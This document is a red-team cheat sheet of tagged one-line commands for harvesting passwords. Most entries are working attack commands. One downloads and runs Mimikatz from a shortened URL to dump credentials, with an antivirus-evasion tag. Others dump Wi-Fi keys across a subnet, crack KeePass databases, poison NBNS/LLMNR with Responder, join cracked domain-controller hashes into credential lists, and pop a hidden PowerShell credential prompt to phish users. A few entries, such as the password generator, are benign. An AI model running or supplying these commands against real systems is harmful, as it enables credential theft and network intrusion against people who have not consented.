### 1. get password policy for root
```
chage -l root
```
**- linux,bash,passwords,enumeration,user information**
#### References:

http://www.thegeekstuff.com/2009/04/chage-linux-password-expiration-and-aging/
__________
### 2. Invoke mimicatz, can use with psexec for pwnage
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
```
**- passwords,Windows,av evasion,powershell**
#### References:

http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
__________
### 3. Recover IIS password
```
c:\windows\system32\inetsrv\appcmd.exe list apppool "SharePoint Central Administration v4" /text:ProcessModel.Password
```
**- passwords,enumeration,Windows,IIS**
#### References:

https://yg.ht
https://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
__________
### 4. Windows Wireless
```
netsh wlan show profile
```
**- networking,passwords,enumeration,Windows,wireless,wifi**
#### References:

http://Microsoft.com
__________
### 5. Windows Wireless
```
netsh wlan show profile name="[SSID]" key=clear
```
**- networking,passwords,Windows,wireless,wifi**
#### References:

https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 6. loop dump wifi keys
```
for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
```
**- bash,loop,passwords,enumeration,wireless,wifi**
#### References:

https://yg.ht
https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 7. KeePass2 Cracking
```
wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
```
**- linux,passwords,Windows,cracking**
#### References:

https://yg.ht
http://www.cervezhack.fr/2013/02/12/bruteforce-a-keepass-file/?lang=en
__________
### 8. Word list generator
```
./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3
```
**- linux,passwords,Windows,cracking**
#### References:

https://hashcat.net/wiki/doku.php?id=maskprocessor
__________
### 9. responder NBNS LLMNR
```
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
```
**- linux,passwords,smb,MitM,privilege escalation**
#### References:

https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
__________
### 10. Password Generator
```
genpasswd [CHAR LENGTH]
```
**- linux,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-random-password-generator/
__________
### 11. create medusa or hydra password list from cracked hashes
```
cat DC_dump.txt | awk -F : '{print $1":"$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info
```
**- pivoting,passwords,enumeration,user information,cracking**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 12. print vpn keys
```
ip xfrm state list
```
**- linux,bash,networking,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
__________
### 13. Ask user for credentials
```
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
```
**- passwords,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
